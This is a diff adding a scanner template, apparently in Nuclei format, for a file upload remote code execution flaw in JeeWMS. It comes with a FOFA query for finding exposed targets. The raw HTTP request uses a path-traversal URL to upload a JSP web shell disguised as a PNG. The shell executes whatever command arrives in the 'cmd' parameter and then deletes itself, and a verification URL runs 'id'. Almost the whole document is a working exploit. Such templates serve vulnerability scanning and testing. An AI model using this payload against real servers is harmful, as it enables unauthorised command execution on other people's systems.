@@ -1,0 +1,49 @@
+id: poc-aus1x876vkamvuol
+info:
+  name: JeeWMS iconController.do 文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aus1x876vkamvuol'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aus1x876vkamvuol
+    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+http:
+- raw:
+  - 'POST /rest/../iconController.do?saveOrUpdateIcon HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+
+
+
+    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+
+    Content-Disposition: form-data; name="name"; filename="t.jsp"
+
+    Content-Type: image/png
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("
+
+
+    ");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("
+
+
+    ");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+
+
+    验证url
+
+    /plug-in/accordion/images/t.jsp?cmd=id'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
